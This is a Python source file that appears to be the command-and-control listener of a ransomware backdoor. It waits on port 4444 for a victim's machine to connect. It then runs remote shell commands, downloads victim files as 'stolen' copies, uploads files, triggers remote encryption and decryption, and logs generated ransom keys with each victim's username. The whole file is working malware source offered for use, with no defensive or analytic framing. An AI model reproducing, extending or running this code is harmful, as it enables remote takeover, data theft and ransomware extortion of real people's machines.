
import socket, struct, os, time
from cryptography.fernet import Fernet

#timeouts for socket
time_out = 3.0
extended_timeout = 60.0

#class for listener sockets to connect to backdoor
class Listener:
    #Initilization of Listener
    def __init__(self, ip, port) -> None:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        self.ip, self.port = ip, port
        listener.listen(0)
        print("\n[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print(f"\n[+] Got a connection from {str(address)}")
        self.connection.settimeout(time_out)  

    #responsible for executing commands on victim's machine and recieving output
    def execute_remotely(self, command):
        self.connection.send(command.encode('utf-8'))
        try:
            response = self.connection.recv(2048)
            return response
        except socket.timeout:
            return b"No output or timeout reached"

    #responsible for downloading file from victims machine and saving it
    def download(self, name, data):
        try:
            self.connection.settimeout(extended_timeout) #extension of timeout
            try:
                file_size_data = self.connection.recv(8)
                file_size = struct.unpack('!Q', file_size_data)[0]  #finds file size
                print(f"Expected file size: {file_size} bytes")
            except Exception as err:
                print(err)

            self.connection.send(b"ready") #ready to recieve data

            name = name.split(sep=".")
            file_path = name[0] + "_stolen." + name[1]

            with open(file_path, "wb") as file: #wb for binary write
                bytes_received = 0
                while bytes_received < file_size:
                    chunk = self.connection.recv(min(4096, file_size - bytes_received))
                    if not chunk:
                        break
                    file.write(chunk)
                    bytes_received += len(chunk)
                    print(f"Received {bytes_received}/{file_size} bytes")

            print(f"File saved successfully and written to {file_path}")
            self.connection.settimeout(time_out)

        except Exception as err:
            print(f"Error occurred: {err}")

    #responsible for uploading file to victim's machine and saving it
    def upload(self, name):
        try:
            self.connection.settimeout(extended_timeout) #extension of timeout
            time.sleep(5) #helps sync the data transfer
            file_size = os.path.getsize(name)
            self.connection.sendall(struct.pack('!Q', file_size)) 
            print(f"Sending file size: {file_size} bytes")

            #waits for the victim to be ready
            while True:
                is_ready = self.connection.recv(4096)
                if is_ready == b"ready":
                    break
            #reads in chunks of 4096 bytes
            with open(name, "rb") as file: #rb for binary read
                bytes_sent = 0
                while bytes_sent < file_size:
                    chunk = file.read(4096)
                    if not chunk:
                        break
                    self.connection.sendall(chunk)
                    bytes_sent += len(chunk)
                    print(f"Sent {bytes_sent}/{file_size} bytes")

            print(f"File '{name}' sent successfully")
            self.connection.settimeout(time_out)
        except Exception as err:
            return print(f"Error occurred during upload: {err}")

    #initiates encryption/decryption on victims machine
    def encrypt_or_decrypt(self, command):
        try:
            self.connection.settimeout(extended_timeout)
            result = self.execute_remotely(command)
            print(result.decode('utf-8', errors='ignore'))
            self.connection.settimeout(time_out)
        except Exception as err:
            print(f"error in encrypt_or_decrypt: {err}")

    #generates random key and saves it to ransom_key.txt file along with ip and username of victim
    def keygen(self):
        try:
            file_name = "ransom_keys.txt"
            key = Fernet.generate_key()
            cipher = Fernet(key)
            key = key.decode("utf-8")
            
            user = self.execute_remotely("whoami").decode("utf-8")
            IP = self.ip
            
            with open(file_name, "a") as file:
                file.write(f"\n{user}\t\t{IP}\t\t{key}")

            print(f"The key is {key} and is saved in {file_name}")

        except Exception as err:
            print(f"An error occurrred: {err}")

    #Control of entire Listener
    def run(self):
        while True:
            command = input(">> ")
            command_parsed = command.split(sep=" ")

            if command_parsed[0] == "download":
                result = self.execute_remotely(command)
                self.download(command_parsed[1], result)
                continue

            elif command_parsed[0] == "upload":
                result = self.execute_remotely(command)
                self.upload(command_parsed[1])
                try:
                    result = self.connection.recv(4096)
                except Exception as err:
                    print(f"error occurred: {err}")
                print(result.decode('utf-8', errors='ignore'))
                continue

            elif command_parsed[0] == "gen":
                self.keygen()
                continue


            elif command_parsed[0] == "enc" or command_parsed[0] == "dec":
                self.encrypt_or_decrypt(command)
                continue

            elif command_parsed[0] == "exit":
                print(f"closing connection")
                exit()
            result = self.execute_remotely(command)
            print(result.decode('utf-8', errors='ignore'))
           
mylistener = Listener("169.254.0.1", 4444)
mylistener.run()